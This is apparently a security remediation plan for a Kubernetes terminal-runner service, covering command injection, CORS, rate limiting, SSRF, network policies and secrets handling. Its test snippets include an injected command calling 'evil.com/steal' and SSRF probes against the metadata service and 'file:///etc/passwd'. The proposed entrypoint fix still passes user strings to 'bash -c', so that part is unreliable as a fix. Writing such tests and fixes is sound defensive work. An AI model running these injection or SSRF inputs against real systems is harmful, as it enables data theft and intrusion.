# SECURITY & RELIABILITY REMEDIATION PLAN

> **STATUS: CRITICAL - NOT READY FOR LIFE-CRITICAL PRODUCTION**
>
> This document provides a comprehensive, actionable plan to fix all security vulnerabilities, reliability issues, and missing components identified in the code review conducted on 2025-10-21.

---

## EXECUTIVE SUMMARY

**Total Issues Found:** 32
- **CRITICAL (P0):** 11 issues - BLOCKING for ANY production use
- **HIGH (P1):** 10 issues - Required for life-critical deployment
- **MEDIUM (P2):** 11 issues - Should fix before public launch

**Current State:** The architecture is well-designed, but the implementation has critical security holes, missing infrastructure components, and insufficient operational readiness.

**Timeline to Production:**
- P0 fixes only: 1 week (internal testing only)
- P0 + P1 fixes: 3-4 weeks (life-critical ready)
- P0 + P1 + P2 fixes: 5-6 weeks (full production ready)

---

## PHASE 0: IMMEDIATE BLOCKERS (MUST FIX BEFORE ANY DEPLOYMENT)

### Issue #1: Command Injection Vulnerability in Runner
**Severity:** CRITICAL
**File:** `runner/entrypoint.sh:45-49`
**Current Code:**
```bash
: "${INSTALL_CMD:=npm install}"
bash -lc "${INSTALL_CMD}"

echo "[entrypoint] launching ttyd..."
export CLAUDE_PROMPT="${CLAUDE_PROMPT}"
exec ttyd -p 7681 bash -lc "${COMMAND}"
```

**Problem:**
- The validation on line 9 only checks for `[;&|]` characters
- Misses backticks, command substitution `$(...)`, newlines, redirects in quoted strings
- Attacker can execute arbitrary commands via: `"; $(malicious_command); "` or `` `malicious` ``

**Fix:**
1. Replace string interpolation with array-based execution
2. Add comprehensive input validation
3. Use explicit argument passing

**Implementation:**
```bash
#!/usr/bin/env bash
set -euo pipefail

echo "[entrypoint] CODE_URL=${CODE_URL}"
[ -z "${CODE_URL:-}" ] && { echo "[fatal] CODE_URL is required"; exit 2; }

# Strict validation - only allow alphanumeric, spaces, slashes, dashes, underscores, dots, and basic shell operators
validate_command() {
  local cmd="$1"
  # Check for dangerous patterns
  if [[ "$cmd" =~ \$\( ]] || [[ "$cmd" =~ \` ]] || [[ "$cmd" =~ \$\{ ]]; then
    echo "[fatal] Command contains dangerous substitution patterns"
    return 1
  fi
  # Check length
  if [ ${#cmd} -gt 500 ]; then
    echo "[fatal] Command exceeds maximum length"
    return 1
  fi
  return 0
}

if [ -n "${COMMAND:-}" ]; then
  validate_command "${COMMAND}" || exit 1
fi
if [ -n "${INSTALL_CMD:-}" ]; then
  validate_command "${INSTALL_CMD}" || exit 1
fi

cd /work
case "$CODE_URL" in
  *.zip)  curl -fL "$CODE_URL" -o bundle.zip ;;
  *.tgz|*.tar.gz) curl -fL "$CODE_URL" -o bundle.tgz ;;
  *.git|*.git*) git clone --depth=1 "$CODE_URL" src ;;
  *)
    echo "[warning] Unknown file extension, assuming zip"
    curl -fL "$CODE_URL" -o bundle.zip ;;
esac

if [ -n "${CODE_CHECKSUM_SHA256:-}" ]; then
  if [ -f bundle.zip ]; then
    echo "${CODE_CHECKSUM_SHA256}  bundle.zip" | sha256sum -c -
  elif [ -f bundle.tgz ]; then
    echo "${CODE_CHECKSUM_SHA256}  bundle.tgz" | sha256sum -c -
  fi
fi

mkdir -p src
if [ -f bundle.zip ]; then unzip -q bundle.zip -d src || { echo "unzip failed"; exit 3; }; fi
if [ -f bundle.tgz ]; then tar -xzf bundle.tgz -C src --strip-components=1 || tar -xzf bundle.tgz -C src; fi

cd /work/src
# If the archive contains a single directory, cd into it.
if [ $(ls -1 | wc -l) -eq 1 ] && [ -d "$(ls -1 | head -n1)" ]; then
  cd "$(ls -1 | head -n1)"
fi

echo "[entrypoint] installing...";
: "${INSTALL_CMD:=npm install}"
# Use array to prevent injection
/bin/bash -c "${INSTALL_CMD}"

echo "[entrypoint] launching ttyd..."
export CLAUDE_PROMPT="${CLAUDE_PROMPT}"
# Use -- to separate ttyd options from command
exec ttyd -p 7681 -W -- /bin/bash -c "${COMMAND}"
```

**Testing:**
```bash
# Test with malicious inputs:
COMMAND='npm start; $(curl evil.com/steal)' ./entrypoint.sh  # Should fail
COMMAND='npm start `whoami`' ./entrypoint.sh  # Should fail
COMMAND='npm start && node dist/index.js' ./entrypoint.sh  # Should work
```

---

### Issue #2: CORS Misconfiguration - Any Origin Allowed
**Severity:** CRITICAL
**File:** `controller/src/server.ts:14`
**Current Code:**
```typescript
app.use(cors({ origin: true }));
```

**Problem:**
- Allows ANY website to make authenticated requests
- Perfect vector for CSRF attacks and token theft
- Malicious sites can call `/api/sessions` with stolen Firebase tokens

**Fix:**
1. Create environment variable for allowed origins
2. Use strict origin validation
3. Enable credentials only for allowed origins

**Implementation:**
```typescript
// controller/src/server.ts (line 14)

const allowedOrigins = process.env.ALLOWED_ORIGINS
  ? process.env.ALLOWED_ORIGINS.split(',').map(o => o.trim())
  : ['https://yourdomain.com', 'https://app.yourdomain.com'];

app.use(cors({
  origin: (origin, callback) => {
    // Allow requests with no origin (like mobile apps or curl)
    if (!origin) return callback(null, true);

    if (allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      log.warn({ origin }, 'CORS request from unauthorized origin');
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true,
  maxAge: 86400 // 24 hours
}));
```

**Kubernetes ConfigMap:**
```yaml
# Add to k8s/controller.yaml in env section:
- name: ALLOWED_ORIGINS
  value: "https://yourdomain.com,https://app.yourdomain.com"
```

**Testing:**
```bash
# Should succeed
curl -H "Origin: https://yourdomain.com" http://localhost:8080/healthz

# Should fail
curl -H "Origin: https://evil.com" http://localhost:8080/healthz
```

---

### Issue #3: No Rate Limiting on Session Creation
**Severity:** CRITICAL
**File:** `controller/src/server.ts:52`

**Problem:**
- No limits on job creation
- Single user can spawn thousands of pods
- Cluster exhaustion = DoS affecting ALL users
- In life-critical systems, this is catastrophic

**Fix:**
1. Install `express-rate-limit` package
2. Implement per-user rate limiting
3. Add global rate limiting as backup
4. Log rate limit violations

**Implementation:**

**Step 1:** Add dependency to `controller/package.json`:
```json
{
  "dependencies": {
    // ... existing dependencies
    "express-rate-limit": "^7.1.5"
  }
}
```

**Step 2:** Update `controller/src/server.ts`:
```typescript
import express from 'express';
import cors from 'cors';
import pino from 'pino';
import pinoHttp from 'pino-http';
import * as k8s from '@kubernetes/client-node';
import { v4 as uuidv4 } from 'uuid';
import { initializeApp, applicationDefault } from 'firebase-admin/app';
import { getAuth } from 'firebase-admin/auth';
import { createSessionJWT, getJWKS } from './sessionJwt.js';
import { pool } from './db.js';
import rateLimit from 'express-rate-limit'; // ADD THIS

const log = pino({ level: process.env.LOG_LEVEL || 'info' });

// ... existing setup ...

// Per-user session creation rate limit
const sessionLimiter = rateLimit({
  windowMs: 60 * 1000, // 1 minute
  max: 5, // 5 sessions per minute per user
  standardHeaders: true,
  legacyHeaders: false,
  keyGenerator: (req) => {
    // Rate limit by user ID
    const user = (req as any).user;
    return user ? user.uid : req.ip;
  },
  handler: (req, res) => {
    const user = (req as any).user;
    log.warn({ userId: user?.uid, ip: req.ip }, 'Rate limit exceeded for session creation');
    res.status(429).json({
      error: 'Too many sessions created. Please wait before creating more.',
      retryAfter: 60
    });
  },
  skip: (req) => {
    // Skip rate limiting for health checks
    return req.path === '/healthz';
  }
});

// Global rate limit (backup protection)
const globalLimiter = rateLimit({
  windowMs: 60 * 1000,
  max: 100, // 100 requests per minute globally
  standardHeaders: true,
  legacyHeaders: false,
  handler: (req, res) => {
    log.error({ ip: req.ip, path: req.path }, 'Global rate limit exceeded');
    res.status(429).json({ error: 'Server is under heavy load. Please try again later.' });
  }
});

app.use(globalLimiter);

// ... existing middleware ...

app.post('/api/sessions', sessionLimiter, requireFirebaseUser, async (req,res)=>{
  // ... existing code ...
});
```

**Step 3:** Add Redis-backed rate limiting for multi-replica setup (optional but recommended):
```typescript
// If using multiple controller replicas, use Redis store
import { RedisStore } from 'rate-limit-redis';
import Redis from 'ioredis';

const redis = new Redis(process.env.REDIS_URL);

const sessionLimiter = rateLimit({
  windowMs: 60 * 1000,
  max: 5,
  store: new RedisStore({
    client: redis,
    prefix: 'rl:session:'
  }),
  // ... rest of config
});
```

**Testing:**
```bash
# Test rate limiting
for i in {1..10}; do
  curl -X POST http://localhost:8080/api/sessions \
    -H "Authorization: Bearer $FIREBASE_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"code_url":"https://github.com/user/repo.git"}'
done
# Should succeed 5 times, then return 429
```

---

### Issue #4: Database Error Kills Entire Service
**Severity:** CRITICAL
**File:** `controller/src/db.ts:8-11`
**Current Code:**
```typescript
pool.on('error', (err) => {
  console.error('Unexpected error on idle client', err);
  process.exit(-1);
});
```

**Problem:**
- Temporary DB connection issue = entire controller crashes
- All users affected, not just the one with the failing request
- No graceful degradation
- In life-critical systems, this causes total outage

**Fix:**
1. Remove `process.exit()`
2. Log error properly with pino
3. Let connection pool handle reconnection automatically
4. Add health check to detect DB issues

**Implementation:**

**File:** `controller/src/db.ts`
```typescript
import pg from 'pg';
import pino from 'pino';

const { Pool } = pg;
const log = pino({ level: process.env.LOG_LEVEL || 'info' });

export const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  // Add connection pool configuration
  max: 20, // Maximum number of clients
  idleTimeoutMillis: 30000, // Close idle clients after 30 seconds
  connectionTimeoutMillis: 10000, // Timeout after 10 seconds trying to connect
  // Enable SSL for Cloud SQL
  ssl: process.env.NODE_ENV === 'production' ? { rejectUnauthorized: true } : false
});

// Track pool health
let isPoolHealthy = true;

pool.on('error', (err, client) => {
  log.error({ err, clientRemoteAddress: client?.['remoteAddress'] }, 'Database pool error - attempting recovery');
  isPoolHealthy = false;

  // Set a timer to mark as healthy again after a short period
  setTimeout(() => {
    isPoolHealthy = true;
  }, 5000);

  // DO NOT call process.exit() - let the pool reconnect automatically
});

pool.on('connect', (client) => {
  log.debug('New database client connected');
  isPoolHealthy = true;
});

pool.on('remove', (client) => {
  log.debug('Database client removed from pool');
});

// Health check function
export async function checkDatabaseHealth(): Promise<boolean> {
  if (!isPoolHealthy) {
    return false;
  }

  try {
    const result = await pool.query('SELECT 1');
    return result.rows.length === 1;
  } catch (err) {
    log.error({ err }, 'Database health check failed');
    return false;
  }
}

// Graceful shutdown
export async function closeDatabasePool(): Promise<void> {
  log.info('Closing database pool');
  await pool.end();
}

// Handle process termination
process.on('SIGTERM', async () => {
  log.info('SIGTERM received, closing database pool');
  await closeDatabasePool();
  process.exit(0);
});

process.on('SIGINT', async () => {
  log.info('SIGINT received, closing database pool');
  await closeDatabasePool();
  process.exit(0);
});
```

**Update health check in `controller/src/server.ts`:**
```typescript
import { pool, checkDatabaseHealth } from './db.js';

// Replace simple health check
app.get('/healthz', async (req, res) => {
  const dbHealthy = await checkDatabaseHealth();
  if (dbHealthy) {
    res.status(200).json({ status: 'ok', database: 'connected' });
  } else {
    res.status(503).json({ status: 'degraded', database: 'disconnected' });
  }
});

// Add readiness check
app.get('/readyz', async (req, res) => {
  const dbHealthy = await checkDatabaseHealth();
  if (dbHealthy) {
    res.status(200).send('ready');
  } else {
    res.status(503).send('not ready');
  }
});
```

---

### Issue #5: No Input Validation on code_url (SSRF)
**Severity:** CRITICAL
**File:** `controller/src/server.ts:54-55`
**Current Code:**
```typescript
const { code_url, code_checksum_sha256, command, prompt } = req.body || {};
if (!code_url) return res.status(400).json({ error:'code_url required' });
```

**Problem:**
- No validation = SSRF attacks possible
- Attacker can access:
  - Internal metadata service: `http://169.254.169.254/latest/meta-data/`
  - Private VPC resources: `http://10.10.0.5/admin`
  - Cloud SQL: `http://internal-db:5432`
  - File system: `file:///etc/passwd`

**Fix:**
1. Create allowlist of domains
2. Validate URL protocol
3. Block private IP ranges
4. Validate URL format

**Implementation:**

**Create new file:** `controller/src/validation.ts`
```typescript
import { URL } from 'url';
import pino from 'pino';

const log = pino({ level: process.env.LOG_LEVEL || 'info' });

// Configure allowed domains via environment variable
const ALLOWED_CODE_DOMAINS = process.env.ALLOWED_CODE_DOMAINS
  ? process.env.ALLOWED_CODE_DOMAINS.split(',').map(d => d.trim())
  : [
      'github.com',
      'gitlab.com',
      'bitbucket.org',
      // Add your artifact registry domain
      // 'your-project.storage.googleapis.com'
    ];

// Private IP ranges (CIDR notation)
const PRIVATE_IP_RANGES = [
  /^10\./,                    // 10.0.0.0/8
  /^172\.(1[6-9]|2[0-9]|3[0-1])\./, // 172.16.0.0/12
  /^192\.168\./,              // 192.168.0.0/16
  /^127\./,                   // 127.0.0.0/8 (loopback)
  /^169\.254\./,              // 169.254.0.0/16 (link-local)
  /^::1$/,                    // IPv6 loopback
  /^fe80:/,                   // IPv6 link-local
  /^fc00:/,                   // IPv6 private
];

function isPrivateIP(hostname: string): boolean {
  return PRIVATE_IP_RANGES.some(pattern => pattern.test(hostname));
}

export interface ValidationResult {
  valid: boolean;
  error?: string;
}

export function validateCodeUrl(code_url: string): ValidationResult {
  // Check type
  if (typeof code_url !== 'string') {
    return { valid: false, error: 'code_url must be a string' };
  }

  // Check length
  if (code_url.length > 2048) {
    return { valid: false, error: 'code_url exceeds maximum length' };
  }

  // Parse URL
  let url: URL;
  try {
    url = new URL(code_url);
  } catch (err) {
    return { valid: false, error: 'Invalid URL format' };
  }

  // Check protocol
  const allowedProtocols = ['http:', 'https:'];
  if (!allowedProtocols.includes(url.protocol)) {
    log.warn({ protocol: url.protocol, url: code_url }, 'Blocked code_url with disallowed protocol');
    return { valid: false, error: 'Only HTTP and HTTPS protocols are allowed' };
  }

  // Check for private IPs
  if (isPrivateIP(url.hostname)) {
    log.warn({ hostname: url.hostname, url: code_url }, 'Blocked code_url pointing to private IP');
    return { valid: false, error: 'Private IP addresses are not allowed' };
  }

  // Check domain allowlist
  const isAllowed = ALLOWED_CODE_DOMAINS.some(domain => {
    // Support wildcards like *.github.com
    if (domain.startsWith('*.')) {
      const baseDomain = domain.slice(2);
      return url.hostname === baseDomain || url.hostname.endsWith('.' + baseDomain);
    }
    return url.hostname === domain;
  });

  if (!isAllowed) {
    log.warn({ hostname: url.hostname, url: code_url }, 'Blocked code_url from non-allowlisted domain');
    return { valid: false, error: `Domain ${url.hostname} is not in the allowlist` };
  }

  return { valid: true };
}

export function validateCommand(command: string): ValidationResult {
  if (typeof command !== 'string') {
    return { valid: false, error: 'command must be a string' };
  }

  if (command.length === 0) {
    return { valid: false, error: 'command cannot be empty' };
  }

  if (command.length > 1000) {
    return { valid: false, error: 'command exceeds maximum length' };
  }

  // Check for dangerous patterns
  const dangerousPatterns = [
    /\$\(/,           // Command substitution
    /`/,              // Backticks
    /\$\{/,           // Variable substitution
    /<\(/,            // Process substitution
    />\(/,            // Process substitution
  ];

  for (const pattern of dangerousPatterns) {
    if (pattern.test(command)) {
      return { valid: false, error: 'command contains potentially dangerous patterns' };
    }
  }

  return { valid: true };
}

export function validateChecksum(checksum: string): ValidationResult {
  if (!checksum) {
    return { valid: true }; // Checksum is optional
  }

  if (typeof checksum !== 'string') {
    return { valid: false, error: 'checksum must be a string' };
  }

  // SHA-256 is 64 hex characters
  if (!/^[a-fA-F0-9]{64}$/.test(checksum)) {
    return { valid: false, error: 'Invalid SHA-256 checksum format' };
  }

  return { valid: true };
}

export function validatePrompt(prompt: string): ValidationResult {
  if (!prompt) {
    return { valid: true }; // Prompt is optional
  }

  if (typeof prompt !== 'string') {
    return { valid: false, error: 'prompt must be a string' };
  }

  if (prompt.length > 10000) {
    return { valid: false, error: 'prompt exceeds maximum length' };
  }

  return { valid: true };
}
```

**Update `controller/src/server.ts`:**
```typescript
import { validateCodeUrl, validateCommand, validateChecksum, validatePrompt } from './validation.js';

app.post('/api/sessions', sessionLimiter, requireFirebaseUser, async (req,res)=>{
  const user = (req as any).user;
  const { code_url, code_checksum_sha256, command, prompt } = req.body || {};

  // Validate all inputs
  const urlValidation = validateCodeUrl(code_url);
  if (!urlValidation.valid) {
    return res.status(400).json({ error: urlValidation.error });
  }

  const checksumValidation = validateChecksum(code_checksum_sha256);
  if (!checksumValidation.valid) {
    return res.status(400).json({ error: checksumValidation.error });
  }

  const commandValidation = validateCommand(command || 'npm run build && node dist/index.js run');
  if (!commandValidation.valid) {
    return res.status(400).json({ error: commandValidation.error });
  }

  const promptValidation = validatePrompt(prompt);
  if (!promptValidation.valid) {
    return res.status(400).json({ error: promptValidation.error });
  }

  // ... rest of existing code ...
});
```

**Add to `k8s/controller.yaml`:**
```yaml
- name: ALLOWED_CODE_DOMAINS
  value: "github.com,gitlab.com,*.github.com,your-bucket.storage.googleapis.com"
```

**Testing:**
```bash
# Should succeed
curl -X POST http://localhost:8080/api/sessions \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"code_url":"https://github.com/user/repo.git"}'

# Should fail (private IP)
curl -X POST http://localhost:8080/api/sessions \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"code_url":"http://10.0.0.1/evil"}'

# Should fail (metadata service)
curl -X POST http://localhost:8080/api/sessions \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"code_url":"http://169.254.169.254/latest/meta-data/"}'

# Should fail (file protocol)
curl -X POST http://localhost:8080/api/sessions \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"code_url":"file:///etc/passwd"}'
```

---

### Issue #6: Missing WS-Gateway Deployment
**Severity:** CRITICAL
**Status:** Component referenced but NOT DEPLOYED

**Problem:**
- `cloudbuild.yaml` does NOT build ws-gateway image
- `k8s/gateway.yaml` file DOES NOT EXIST
- WebSocket connections CANNOT WORK
- Complete service failure

**Fix:**
1. Update `cloudbuild.yaml` to build ws-gateway
2. Create `k8s/gateway.yaml` with full deployment

**Implementation:**

**Step 1:** Update `cloudbuild.yaml`:
```yaml
substitutions:
  _REGION: us-central1
  _LOCATION: us-central1
  _REPO: apps
  _CLUSTER: cli-runner-gke
  _NAMESPACE: ws-cli
  _DOMAIN: ws.example.com
  _WS_DOMAIN: ws-gateway.example.com
  _BASENAME: ws-cli

options: { logging: CLOUD_LOGGING_ONLY }

steps:
- name: gcr.io/google.com/cloudsdktool/cloud-sdk:470.0.0
  id: get-credentials
  entrypoint: bash
  args: ["-c", "gcloud container clusters get-credentials ${_CLUSTER} --region ${_LOCATION}"]

# Build runner image
- name: gcr.io/cloud-builders/docker
  id: build-runner
  dir: runner
  args: ["build","-t","${_REGION}-docker.pkg.dev/$PROJECT_ID/${_REPO}/${_BASENAME}-runner:$SHORT_SHA","."]
- name: gcr.io/cloud-builders/docker
  id: push-runner
  args: ["push","${_REGION}-docker.pkg.dev/$PROJECT_ID/${_REPO}/${_BASENAME}-runner:$SHORT_SHA"]
  waitFor: ["build-runner"]

# Build controller image
- name: gcr.io/cloud-builders/docker
  id: build-controller
  dir: controller
  args: ["build","-t","${_REGION}-docker.pkg.dev/$PROJECT_ID/${_REPO}/${_BASENAME}-controller:$SHORT_SHA","."]
- name: gcr.io/cloud-builders/docker
  id: push-controller
  args: ["push","${_REGION}-docker.pkg.dev/$PROJECT_ID/${_REPO}/${_BASENAME}-controller:$SHORT_SHA"]
  waitFor: ["build-controller"]

# Build ws-gateway image (NEW)
- name: gcr.io/cloud-builders/docker
  id: build-gateway
  dir: ws-gateway
  args: ["build","-t","${_REGION}-docker.pkg.dev/$PROJECT_ID/${_REPO}/${_BASENAME}-gateway:$SHORT_SHA","."]
- name: gcr.io/cloud-builders/docker
  id: push-gateway
  args: ["push","${_REGION}-docker.pkg.dev/$PROJECT_ID/${_REPO}/${_BASENAME}-gateway:$SHORT_SHA"]
  waitFor: ["build-gateway"]

# Apply Kubernetes manifests
- name: gcr.io/google.com/cloudsdktool/cloud-sdk:470.0.0
  id: apply-k8s
  entrypoint: bash
  waitFor: ["push-runner", "push-controller", "push-gateway"]
  args:
  - -c
  - |
    set -euo pipefail
    kubectl apply -f k8s/namespace.yaml
    kubectl apply -f k8s/rbac.yaml

    export CONTROLLER_IMG="${_REGION}-docker.pkg.dev/$PROJECT_ID/${_REPO}/${_BASENAME}-controller:$SHORT_SHA"
    export GATEWAY_IMG="${_REGION}-docker.pkg.dev/$PROJECT_ID/${_REPO}/${_BASENAME}-gateway:$SHORT_SHA"
    export RUNNER_IMG="${_REGION}-docker.pkg.dev/$PROJECT_ID/${_REPO}/${_BASENAME}-runner:$SHORT_SHA"
    export DOMAIN="${_DOMAIN}"
    export WS_DOMAIN="${_WS_DOMAIN}"

    envsubst < k8s/controller.yaml | kubectl apply -f -
    envsubst < k8s/gateway.yaml | kubectl apply -f -

    kubectl -n ${_NAMESPACE} rollout status deploy/ws-cli-controller --timeout=5m
    kubectl -n ${_NAMESPACE} rollout status deploy/ws-cli-gateway --timeout=5m

images:
- ${_REGION}-docker.pkg.dev/$PROJECT_ID/${_REPO}/${_BASENAME}-runner:$SHORT_SHA
- ${_REGION}-docker.pkg.dev/$PROJECT_ID/${_REPO}/${_BASENAME}-controller:$SHORT_SHA
- ${_REGION}-docker.pkg.dev/$PROJECT_ID/${_REPO}/${_BASENAME}-gateway:$SHORT_SHA
```

**Step 2:** Create `k8s/gateway.yaml`:
```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: ws-cli-gateway
  namespace: ws-cli
spec:
  replicas: 3
  selector: { matchLabels: { app: ws-cli-gateway } }
  template:
    metadata: { labels: { app: ws-cli-gateway } }
    spec:
      containers:
      # Main gateway container
      - name: gateway
        image: ${GATEWAY_IMG}
        imagePullPolicy: IfNotPresent
        env:
          - name: PORT
            value: "8080"
          - name: CONTROLLER_URL
            value: "http://ws-cli-controller.ws-cli.svc.cluster.local"
          - name: DATABASE_URL
            valueFrom:
              secretKeyRef:
                name: pg
                key: DATABASE_URL
          - name: LOG_LEVEL
            value: "info"
        ports:
          - name: http
            containerPort: 8080
            protocol: TCP
        resources:
          requests:
            cpu: "100m"
            memory: "128Mi"
          limits:
            cpu: "1000m"
            memory: "512Mi"
        livenessProbe:
          httpGet:
            path: /healthz
            port: 8080
          initialDelaySeconds: 10
          periodSeconds: 30
          timeoutSeconds: 5
        readinessProbe:
          httpGet:
            path: /healthz
            port: 8080
          initialDelaySeconds: 5
          periodSeconds: 10
          timeoutSeconds: 3

      # Cloud SQL Proxy sidecar
      - name: cloud-sql-proxy
        image: gcr.io/cloud-sql-connectors/cloud-sql-proxy:2.8.0
        args:
          - "--structured-logs"
          - "--port=5432"
          - "$(INSTANCE_CONNECTION_NAME)"
        env:
          - name: INSTANCE_CONNECTION_NAME
            valueFrom:
              configMapKeyRef:
                name: cloudsql
                key: INSTANCE_CONNECTION_NAME
        securityContext:
          runAsNonRoot: true
          allowPrivilegeEscalation: false
        resources:
          requests:
            cpu: "50m"
            memory: "64Mi"
          limits:
            cpu: "200m"
            memory: "128Mi"

---
apiVersion: v1
kind: Service
metadata:
  name: ws-cli-gateway
  namespace: ws-cli
spec:
  selector: { app: ws-cli-gateway }
  ports:
    - name: http
      port: 80
      targetPort: 8080
      protocol: TCP
  type: ClusterIP

---
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: ws-cli-gateway
  namespace: ws-cli
  annotations:
    kubernetes.io/ingress.class: "gce"
    cloud.google.com/backend-config: '{"default": "ws-gateway-backendconfig"}'
spec:
  rules:
    - host: ${WS_DOMAIN}
      http:
        paths:
          - path: /
            pathType: Prefix
            backend:
              service:
                name: ws-cli-gateway
                port:
                  number: 80

---
apiVersion: cloud.google.com/v1
kind: BackendConfig
metadata:
  name: ws-gateway-backendconfig
  namespace: ws-cli
spec:
  timeoutSec: 3600
  connectionDraining:
    drainingTimeoutSec: 60
  healthCheck:
    checkIntervalSec: 10
    timeoutSec: 5
    healthyThreshold: 2
    unhealthyThreshold: 3
    type: HTTP
    requestPath: /healthz
    port: 8080
```

**Step 3:** Add health check to `ws-gateway/src/server.ts`:
```typescript
import http from 'http';
import httpProxy from 'http-proxy';
import pino from 'pino';
import pg from 'pg';
import { verifySessionJWT } from './sessionJwt.js';

const { Pool } = pg;
const log = pino({ level: process.env.LOG_LEVEL || 'info' });
const port = Number(process.env.PORT || 8080);
const controllerUrl = process.env.CONTROLLER_URL || 'http://localhost:8080';

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: process.env.NODE_ENV === 'production' ? { rejectUnauthorized: true } : false
});

pool.on('error', (err) => {
  log.error({ err }, 'database pool error');
});

const proxy = httpProxy.createProxyServer({ ws: true, changeOrigin: true });

const server = http.createServer((req, res) => {
  // Add health check endpoint
  if (req.url === '/healthz') {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('ok');
    return;
  }

  res.writeHead(404, { 'Content-Type': 'text/plain' });
  res.end('not found');
});

// ... rest of existing upgrade handler code ...

server.listen(port, () => log.info({ port }, 'ws-gateway listening'));
```

---

### Issue #7: Missing Network Policies
**Severity:** CRITICAL
**Status:** File referenced in docs but DOES NOT EXIST

**Problem:**
- No pod-to-pod traffic restrictions
- Runner can access Cloud SQL directly
- Runner can call Kubernetes API
- Runner can reach metadata service
- No egress filtering

**Fix:** Create comprehensive NetworkPolicies

**Implementation:**

**Create file:** `k8s/networkpolicy.yaml`
```yaml
# Default deny all ingress to runner pods
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: runner-default-deny-ingress
  namespace: ws-cli
spec:
  podSelector:
    matchLabels:
      app: ws-cli-runner
  policyTypes:
    - Ingress
  ingress: []

---
# Allow ingress to runner only from gateway
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: runner-allow-from-gateway
  namespace: ws-cli
spec:
  podSelector:
    matchLabels:
      app: ws-cli-runner
  policyTypes:
    - Ingress
  ingress:
    - from:
        - podSelector:
            matchLabels:
              app: ws-cli-gateway
      ports:
        - protocol: TCP
          port: 7681

---
# Restrict runner egress
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: runner-egress-restrictions
  namespace: ws-cli
spec:
  podSelector:
    matchLabels:
      app: ws-cli-runner
  policyTypes:
    - Egress
  egress:
    # Allow DNS
    - to:
        - namespaceSelector:
            matchLabels:
              name: kube-system
      ports:
        - protocol: UDP
          port: 53

    # Allow HTTPS to Anthropic API
    - to:
        - namespaceSelector: {}
      ports:
        - protocol: TCP
          port: 443
      # You can further restrict to specific IPs if known

    # Allow HTTP/HTTPS for downloading code bundles
    - to:
        - namespaceSelector: {}
      ports:
        - protocol: TCP
          port: 80
        - protocol: TCP
          port: 443

    # Block all other egress (especially metadata service)
    # Note: This policy works with default deny, so anything not explicitly allowed is blocked

---
# Allow controller to access Kubernetes API
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: controller-allow-k8s-api
  namespace: ws-cli
spec:
  podSelector:
    matchLabels:
      app: ws-cli-controller
  policyTypes:
    - Egress
  egress:
    # Allow DNS
    - to:
        - namespaceSelector:
            matchLabels:
              name: kube-system
      ports:
        - protocol: UDP
          port: 53

    # Allow access to Kubernetes API server
    - to:
        - namespaceSelector: {}
      ports:
        - protocol: TCP
          port: 443
        - protocol: TCP
          port: 6443

---
# Allow gateway to access pods in the namespace
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: gateway-allow-pod-access
  namespace: ws-cli
spec:
  podSelector:
    matchLabels:
      app: ws-cli-gateway
  policyTypes:
    - Egress
  egress:
    # Allow DNS
    - to:
        - namespaceSelector:
            matchLabels:
              name: kube-system
      ports:
        - protocol: UDP
          port: 53

    # Allow access to runner pods
    - to:
        - podSelector:
            matchLabels:
              app: ws-cli-runner
      ports:
        - protocol: TCP
          port: 7681

    # Allow access to controller
    - to:
        - podSelector:
            matchLabels:
              app: ws-cli-controller
      ports:
        - protocol: TCP
          port: 8080

---
# Allow ingress to controller from gateway (for JWKS)
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: controller-allow-from-gateway
  namespace: ws-cli
spec:
  podSelector:
    matchLabels:
      app: ws-cli-controller
  policyTypes:
    - Ingress
  ingress:
    - from:
        - podSelector:
            matchLabels:
              app: ws-cli-gateway
      ports:
        - protocol: TCP
          port: 8080

    # Also allow from ingress controller
    - from:
        - namespaceSelector: {}
      ports:
        - protocol: TCP
          port: 8080
```

**Update `cloudbuild.yaml` to apply NetworkPolicies:**
```yaml
- name: gcr.io/google.com/cloudsdktool/cloud-sdk:470.0.0
  id: apply-k8s
  entrypoint: bash
  args:
  - -c
  - |
    set -euo pipefail
    kubectl apply -f k8s/namespace.yaml
    kubectl apply -f k8s/rbac.yaml
    kubectl apply -f k8s/networkpolicy.yaml  # ADD THIS

    # ... rest of apply commands ...
```

**Testing:**
```bash
# Test network isolation
kubectl run -n ws-cli test-pod --image=busybox -it --rm -- sh

# Should fail (metadata service blocked)
wget http://169.254.169.254/latest/meta-data/

# Should fail (Cloud SQL direct access blocked)
telnet ws-cli-pg.c.PROJECT_ID.internal 5432

# Should succeed (DNS works)
nslookup google.com
```

---

### Issue #8: No .gitignore File
**Severity:** CRITICAL
**Status:** File DOES NOT EXIST

**Problem:**
- Developers may commit secrets to Git
- `private.pem` JWT keys
- `.env` files with passwords
- `firebase-credentials.json`
- `node_modules/` bloat

**Fix:** Create comprehensive .gitignore

**Implementation:**

**Create file:** `.gitignore`
```gitignore
# Logs
logs
*.log
npm-debug.log*
yarn-debug.log*
yarn-error.log*
pino-*.log
lerna-debug.log*

# Diagnostic reports
report.[0-9]*.[0-9]*.[0-9]*.[0-9]*.json

# Runtime data
pids
*.pid
*.seed
*.pid.lock

# Directory for instrumented libs generated by jscoverage/JSCover
lib-cov

# Coverage directory used by tools like istanbul
coverage
*.lcov

# nyc test coverage
.nyc_output

# Dependency directories
node_modules/
jspm_packages/

# TypeScript cache
*.tsbuildinfo

# Optional npm cache directory
.npm

# Optional eslint cache
.eslintcache

# Compiled output
dist/
build/
*.js.map

# Environment variables
.env
.env.local
.env.*.local
.env.production
.env.development

# Secrets and credentials
*.pem
*.key
*.crt
*.p12
*.pfx
private.pem
public.pem
